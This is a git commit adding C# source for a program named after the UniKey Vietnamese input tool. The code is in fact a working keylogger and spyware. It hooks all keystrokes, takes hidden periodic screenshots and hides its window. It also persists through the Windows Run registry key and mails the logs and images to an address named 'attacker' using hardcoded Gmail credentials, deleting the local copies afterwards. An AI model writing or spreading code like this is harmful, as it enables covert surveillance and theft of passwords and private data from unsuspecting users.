542e728aedfdc6ced302d607699320fa26afd625
PhucTrang <Minhphucpk.1997@gmail.com>
2018-04-07 14:04:38 +0700

    first commit

---
+++ Code/UniKey 4.2 RC2/Program.cs
@@ -0,0 +1,345 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Net.Mail;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace UniKey_4._2_RC2
+{
+    internal class Program
+    {
+        #region hook key board
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        private static string logName = "Log_";
+        private static string logExtendtion = ".txt";
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        /// <summary>
+        /// Delegate a LowLevelKeyboardProc to use user32.dll
+        /// </summary>
+        /// <param name="nCode"></param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
+        private delegate IntPtr LowLevelKeyboardProc(
+        int nCode, IntPtr wParam, IntPtr lParam);
+
+        /// <summary>
+        /// Set hook into all current process
+        /// </summary>
+        /// <param name="proc"></param>
+        /// <returns></returns>
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            {
+                using (ProcessModule curModule = curProcess.MainModule)
+                {
+                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+                }
+            }
+        }
+
+        /// <summary>
+        /// Every time the OS call back pressed key. Catch them
+        /// then cal the CallNextHookEx to wait for the next key
+        /// </summary>
+        /// <param name="nCode"></param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+
+                CheckHotKey(vkCode);
+                WriteLog(vkCode);
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        /// <summary>
+        /// Write pressed key into log.txt file
+        /// </summary>
+        /// <param name="vkCode"></param>
+        private static void WriteLog(int vkCode)
+        {
+            Console.WriteLine((Keys)vkCode);
+            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+            StreamWriter sw = new StreamWriter(logNameToWrite, true);
+            sw.Write((Keys)vkCode);
+            sw.Close();
+        }
+
+        /// <summary>
+        /// Start hook key board and hide the key logger
+        /// Key logger only show again if pressed right Hot key
+        /// </summary>
+        private static void HookKeyboard()
+        {
+            _hookID = SetHook(_proc);
+            Application.Run();
+            UnhookWindowsHookEx(_hookID);
+        }
+
+        private static bool isHotKey = false;
+        private static bool isShowing = false;
+        private static Keys previoursKey = Keys.Separator;
+
+        private static void CheckHotKey(int vkCode)
+        {
+            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.F10)
+                isHotKey = true;
+
+            if (isHotKey)
+            {
+                if (!isShowing)
+                {
+                    DisplayWindow();
+                }
+                else
+                    HideWindow();
+
+                isShowing = !isShowing;
+            }
+
+            previoursKey = (Keys)vkCode;
+            isHotKey = false;
+        }
+
+        #endregion hook key board
+
+        #region Capture
+
+        private static string imagePath = "Image_";
+        private static string imageExtendtion = ".png";
+
+        private static int imageCount = 0;
+        private static int captureTime = 3000;
+
+        /// <summary>
+        /// Capture al screen then save into ImagePath
+        /// </summary>
+        private static void CaptureScreen()
+        {
+            //Create a new bitmap.
+            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                                           Screen.PrimaryScreen.Bounds.Height,
+                                           PixelFormat.Format32bppArgb);
+
+            // Create a graphics object from the bitmap.
+            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
+
+            // Take the screenshot from the upper left corner to the right bottom corner.
+            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
+                                        Screen.PrimaryScreen.Bounds.Y,
+                                        0,
+                                        0,
+                                        Screen.PrimaryScreen.Bounds.Size,
+                                        CopyPixelOperation.SourceCopy);
+
+            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+
+            if (!Directory.Exists(directoryImage))
+            {
+                Directory.CreateDirectory(directoryImage);
+            }
+            // Save the screenshot to the specified path that the user has chosen.
+            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);
+
+            try
+            {
+                bmpScreenshot.Save(imageName, ImageFormat.Png);
+                File.SetAttributes(imageName, File.GetAttributes(imagePath) | FileAttributes.Hidden);
+            }
+            catch
+            {
+            }
+            imageCount++;
+        }
+
+        #endregion Capture
+
+        #region Timer
+
+        private static int interval = 1;
+
+        private static void StartTimmer()
+        {
+            Thread thread = new Thread(() =>
+            {
+                while (true)
+                {
+                    Thread.Sleep(1);
+
+                    if (interval % captureTime == 0)
+                        CaptureScreen();
+
+                    if (interval % mailTime == 0)
+                        SendMail();
+
+                    interval++;
+
+                    if (interval >= 1000000)
+                        interval = 0;
+                }
+            });
+            thread.IsBackground = true;
+            thread.Start();
+        }
+
+        #endregion Timer
+
+        #region Windows
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        // hide window code
+        private const int SW_HIDE = 0;
+
+        // show window code
+        private const int SW_SHOW = 5;
+
+        private static void HideWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_HIDE);
+        }
+
+        private static void DisplayWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_SHOW);
+        }
+
+        #endregion Windows
+
+        #region Registry that open with window
+
+        private static void StartWithOS()
+        {
+            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
+            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            string keyvalue = "1";
+            try
+            {
+                regkey.SetValue("Index", keyvalue);
+                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
+                regkey.Close();
+            }
+            catch (System.Exception ex)
+            {
+            }
+        }
+
+        #endregion Registry that open with window
+
+        #region Mail
+
+        private static int mailTime = 200000;
+
+        private static void SendMail()
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+                mail.From = new MailAddress("noob.user.20188@gmail.com");
+                mail.To.Add("attacker.20188@gmail.com");
+                mail.Subject = "date: " + DateTime.Now.ToLongDateString();
+                mail.Body = "Info\n";
+
+                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+
+                if (File.Exists(logFile))
+                {
+                    StreamReader sr = new StreamReader(logFile);
+
+                    mail.Body += sr.ReadToEnd();
+
+                    sr.Close();
+                }
+
+                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+                DirectoryInfo image = new DirectoryInfo(directoryImage);
+
+                foreach (FileInfo item in image.GetFiles("*.png"))
+                {
+                    if (File.Exists(directoryImage + "\\" + item.Name))
+                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
+                }
+
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential("noob.user.20188@gmail.com", "test@1234");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+                Console.WriteLine("Send mail!");
+
+                System.IO.DirectoryInfo di = new DirectoryInfo(imagePath);
+
+                foreach (FileInfo file in di.GetFiles())
+                {
+                    file.Delete();
+                }
+                foreach (DirectoryInfo dir in di.GetDirectories())
+                {
+                    dir.Delete(true);
+                }
+                // phải làm cái này ở mail dùng để gửi phải bật lên
+                // https://www.google.com/settings/u/1/security/lesssecureapps
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+
+        #endregion Mail
+
+        private static void Main(string[] args)
+        {
+            StartWithOS();
+            HideWindow();
+            StartTimmer();
+            HookKeyboard();
+        }
+    }
+}
